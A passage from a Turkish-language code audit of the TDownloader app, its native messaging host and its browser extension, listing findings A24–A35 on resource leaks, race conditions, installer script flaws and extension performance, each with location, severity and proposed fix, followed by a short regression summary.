- **Düzeltme:** `ClientDisconnected`'da o bağlantıya ait `qualities` işlerini iptal et; yayında `Task.WhenAll` + zaman aşımı.
- **Kesin / tahmin:** Kod kesin; tıkanma tahmin.

### A24 - GDI+/GDI nesne sızıntıları (küçük, finalizer'a kalıyor)
- **Durum:** Kısmen (4fe46db): VideoButtonWindow `using var clip`. Atlanan: Font ve ShellIcons bitmap'leri.
- **Dosya:satır:** `Ui/VideoButtonWindow.cs:245` (`var clip = g.Clip;` Region dispose edilmiyor; fade'de her 30 ms), `Services/VideoOverlayMediaSink.cs:428` (kalın `Font` dispose edilmiyor), `Ui/ShellIcons.cs:38,41` (`ic.ToBitmap()` ve `new Bitmap(16,16)` ImageList kopyaladıktan sonra dispose edilmiyor), `Forms/MainForm.cs:551` (zamanlayıcılar dispose ediliyor, sorun yok).
- **Önem:** Düşük (yerel düğme varsayılan kapalı; `Region`/`Font` finalizable).
- **Düzeltme:** `using var clip = g.Clip;` / eklenen bitmap'leri dispose et.
- **Kesin / tahmin:** Kesin.

### A25 - Zamanlayıcı saati kültür duyarlı biçimleniyor
- **Durum:** Düzeltildi (4fe46db): InvariantCulture.
- **Dosya:satır:** `Forms/SchedulerDialog.cs:78` (`_time.Value.ToString("HH:mm")`), `Services/SchedulerService.cs:15` (`TimeSpan.TryParse(s.StartTime)` kültür duyarlı).
- **Sorun:** `:` ayırıcısı kültürün saat ayırıcısıdır (ör. fi-FI `.`); biçim `14.30` olursa `TimeSpan.TryParse` yanlış değer üretir. tr-TR'de sorun yok.
- **Önem:** Düşük.
- **Düzeltme:** `CultureInfo.InvariantCulture` kullan.
- **Kesin / tahmin:** Tahmin.

### A26 - `OptionsDialog.Collect` canlı ayar nesnesini yarım durumda bırakıyor
- **Durum:** Düzeltildi (4fe46db): yeni sözlük doldurulup atanır.
- **Dosya:satır:** `Forms/OptionsDialog.cs:193-195` (`_s.CategoryFolders = new();` sonra dolduruluyor; `_s` = `Manager.Settings` canlı nesnesi).
- **Sorun:** Doldurma sırasında başka bir iş parçacığı (IPC kapısı, motor) `CategoryFolders`'ı boş görür; "Uygula" sonrası ayar kısa süre varsayılan klasöre düşer.
- **Önem:** Düşük.
- **Düzeltme:** Yeni sözlüğü doldurduktan sonra ata.
- **Kesin / tahmin:** Tahmin (yarış penceresi çok dar).

### A27 - `async void` komutlarda istisna işleyicisi yok; genel işleyici yok
- **Durum:** Atlandı (düşük).
- **Dosya:satır:** `MainForm.cs:732, 743, 779` (`DeleteSelected`, `DeleteSelectedFromDisk`, `DeleteCompleted`), `Program.cs` (genel `ThreadException/UnhandledException` yok).
- **Sorun:** `RemoveAsync` bir istisna atarsa (örn. `act.Stop()` sırasında) varsayılan WinForms hata iletişim kutusu çıkar; `_diskDeleting` `finally` ile temizleniyor ama kalan öğeler silinmeden kalır.
- **Önem:** Düşük.
- **Düzeltme:** try/catch + kullanıcıya özet; `Application.ThreadException` için günlük.
- **Kesin / tahmin:** Kesin.

### A28 - İkinci örnek yolunda `ApplicationConfiguration.Initialize()` yok
- **Durum:** Düzeltildi (4fe46db): ikinci örnek dalında ApplicationConfiguration.Initialize().
- **Dosya:satır:** `Program.cs:12-29`.
- **Sorun:** "Zaten açık" iletişim kutusu yüksek DPI ayarı olmadan çizilir (bulanık olabilir).
- **Önem:** Düşük.
- **Düzeltme:** `ApplicationConfiguration.Initialize()` ikinci örnek dalında da çağrılsın.
- **Kesin / tahmin:** Tahmin.

### A29 - `update-dist.ps1`: yol öneki eşleşmesi gevşek, zorla sonlandırma
- **Durum:** Atlandı (düşük).
- **Dosya:satır:** `installer/update-dist.ps1:8-9, 11`.
- **Sorun:** `StartsWith($dst)` `...\dist-new\...` ve `...\dist2\...` içindeki süreçleri de eşler (sonda `\` yok); `Stop-Process -Force` uygulamayı zarifçe kapatmadan öldürür (yarım yazılmış `downloads.json`: atomik yazım + `.bak` var, risk düşük); sonda App/Host yeniden başlatılmıyor. `-Recurse` yok (şimdilik `dist-new` düz olduğundan sorun yok).
- **Önem:** Düşük.
- **Düzeltme:** `$dst + '\'` öneki; önce `CloseMainWindow`, sonra zorla.
- **Kesin / tahmin:** Kesin.

### A30 - `installer/` kurulum betiği ve şablon
- **Durum:** Atlandı (düşük).
- **Dosya:satır:** `installer/install-host.ps1:42-44, 49-56`, `installer/com.tdownloader.host.json`.
- **Sorun:** (1) Geliştirici yerleşiminde (`src\...\bin\Release\net10.0`) Host klasöründe `TDownloader.exe` bulunmaz; betik yalnızca uyarı verir ama Host `App` başlatamaz (`HostRunner.TryLaunchApp`), A5 senaryosunun tersi sessizce çalışmaz. (2) Şablon JSON (`__HOST_PATH__`) betikte kullanılmıyor (betik içinde yeniden üretiliyor): iki kaynak ayrışabilir. Kimlik (`lgceenlgaaekpbeifoookmmkjipmcboc`), `manifest.json` `key`'inden türetilenle doğrulandı (sorun yok). `Set-ItemProperty -Name '(default)'` doğru kullanım.
- **Önem:** Düşük.
- **Düzeltme:** `-AppExe` parametresi ekle ve Host'a `--app` yaz; şablon dosyasını sil veya betikte kullan.
- **Kesin / tahmin:** Kesin.

### A31 - Aynı anda iki tarayıcı: `tabId` çakışması App'te aynı sekme gibi görünür
- **Durum:** Atlandı (düşük).
- **Dosya:satır:** `Services/VideoOverlayMediaSink.cs:33, 89-95` (`_tabs` anahtarı yalnızca `tabId`), `IpcCoordinator.cs` (bağlantı bilgisi sekmeye yazılmıyor).
- **Sorun:** Chrome ve Brave/Edge'in sekme numaraları bağımsızdır; çakışırsa biri öbürünün `media` listesini ezer, `tabClosed` öbürünün durumunu siler.
- **Önem:** Düşük (çakışma olasılığı düşük).
- **Düzeltme:** Anahtarı (bağlantı kimliği, tabId) yap.
- **Kesin / tahmin:** Tahmin.

### A32 - Sekme başına öğe kotası dolunca yeni medya hiç listelenmiyor (eviction yok)
- **Durum:** Atlandı (düşük).
- **Dosya:satır:** `extension/lib/media.js:96` (`g.items.size >= maxItems(50)` veya `tabCount >= maxTabItems(120)` -> `dropped++`).
- **Sorun:** Tek sayfa uygulamasında (navigasyon olmadan çok video) kota dolunca sonraki videolar kayda girmez; `clearTab` yalnızca navigasyonda çalışır.
- **Önem:** Düşük.
- **Düzeltme:** En eski öğeyi at (FIFO) veya "yeni video başladı" olayında sekmeyi temizle.
- **Kesin / tahmin:** Kesin (kod); sıklık tahmin.

### A33 - Her çerçevede koşulsuz zamanlayıcılar ve açılışta çift `cfg` mesajı
- **Durum:** Atlandı (düşük; davranış değişikliği).
- **Dosya:satır:** `extension/button.js:240` (her çerçevede 4 sn'de bir `discover`), `:15`, `extension/content.js:206` (her çerçeve hem `content.js` hem `button.js` ile `cfg` ister).
- **Sorun:** Reklam çerçevesi çok olan sayfalarda yüzlerce mesaj service worker'ı sık uyandırır; `discover` her çerçevede `querySelectorAll("video")` çalıştırır.
- **Önem:** Düşük (perf).
- **Düzeltme:** `cfg`'yi tek script istesin; `discover`'ı `MutationObserver(childList)` ile `video` etiketi eklenince çalıştır, interval'i sil.
- **Kesin / tahmin:** Kesin (kod).

### A34 - Host: `origin` argümanı doğrulanmıyor (bilgi)
- **Durum:** Atlandı (düşük).
- **Dosya:satır:** `src/TDownloader.Host/Program.cs:19`.
- **Sorun:** Host, çağıranın kimliğini yalnızca Chrome'un `allowed_origins`'ine dayandırıyor; `origin` sadece günlüğe yazılıyor. Tarayıcı tarafı güvenli olduğundan sorun değil; ancak Host'u elle başlatan yerel bir süreç (`--app`, `--pipe`, `--log` kontrolü ile) keyfi exe çalıştırabilir. Yerel kötü niyetli süreç zaten aynı yetkiye sahip, bu yüzden pratik risk düşük.
- **Önem:** Düşük.
- **Düzeltme:** `origin`'i beklenen kimlikle karşılaştır; `--app` yalnızca imzalı/aynı klasördeki exe'ye izin versin.
- **Kesin / tahmin:** Kesin (kod); sömürülebilirlik tahmin.

### A35 - `TDownloader.Host` App'i başlatırken yönlendirilmiş stdio okunmuyor
- **Durum:** Atlandı: yönlendirme bilinçlidir (App Chrome'un stdio'sunu miras alıp tarayıcıya bağlı kalmasın); miras almak daha kötü olurdu.
- **Dosya:satır:** `src/TDownloader.Host/HostRunner.cs:131-141`.
- **Sorun:** `RedirectStandardInput/Output/Error=true` ama akışlar hiç okunmuyor ve `using var p` Process'i hemen dispose ediyor; App'in (veya onun çalıştırdığı yt-dlp/ffmpeg alt süreçlerinin, yönlendirmeyi miras alanların) stdout/stderr'e yazması kırık boruya yazma olur. WinForms App normalde yazmaz; ancak konsola yazan alt süreçler beklenmedik şekilde `IOException` alabilir.
- **Önem:** Düşük (tahmin).
- **Düzeltme:** `RedirectStandard*=false` + `CreateNoWindow=true` + `UseShellExecute=false` ile miras alma; veya akışları kapatıp boş bırakan bir sarmalayıcı.
- **Kesin / tahmin:** Tahmin.

---

## Kısa değerlendirme (regresyon listesi için)

- **DownloadCaptureGate:** Anında kabul ve UI'a bağımlılık yok, doğru çalışıyor; ama App tarafı tekilleştirme ile birleşince A4, çökme/kapanışta A13.
- **IPC paralel işleme / yanıt eşleme:** `requestId` ile eşleme tutarlı; `IpcServer` tamamlanan işleyiciyi satır içinde, yavaşı arka planda yazıyor (tamam). Yanlış isteğe eşleşme bulmadım (`native.js` her `pending` için `match` çağırıyor; `pong` herhangi bir `pong`la eşleşir, zararsız). Kopukken (`A6`, `A8`) ve pipe adı/izin tarafında (`A7`) sorun var.
- **Artımlı media/append:** `MediaMerge` doğru; ama eklenti tarafında kayıp/temizleme boşlukları A8/A9.
- **qualities/qualitiesCancel/tabClosed:** akış mantıklı; yarışlar A15, tab çakışması A31.
- **_info LRU (`SharedTaskCache`):** Mantık doğru (bekleyen sayacı, sabitlenmiş girdiler); HLS işi iptal edilemiyor (A22).
- **UpdateGate/1 Hz metinler:** Doğru; yalnızca "eta" sıralama anahtarı eksik (A21), ilerleme sırasında `Phase` gösterilmiyor (A14).
- **Diskten Sil:** Süren indirmeyi durduruyor (`RemoveAsync` bekler); çöp kutusu garantisi zayıf (A3).
- **Pano STA okuma:** `StaCall` doğru; UI en çok 400 ms bekliyor. Zaman aşımına uğrayan okuma iş parçacıkları kuyruk tutabilir (düşük risk).
- **Tek örnek + uyarı:** Çalışıyor; DPI ayarı eksik (A28).
- **button.js IntersectionObserver/rAF:** Mantık sağlam; asıl sorun güven sınırı (A2) ve her çerçeve zamanlayıcıları (A33).
- **capture.js isFreshDownload/waitForFilename/15 sn:** Çift indirme koruması çalışıyor; gizli mod (A12), menü yolu (A19).
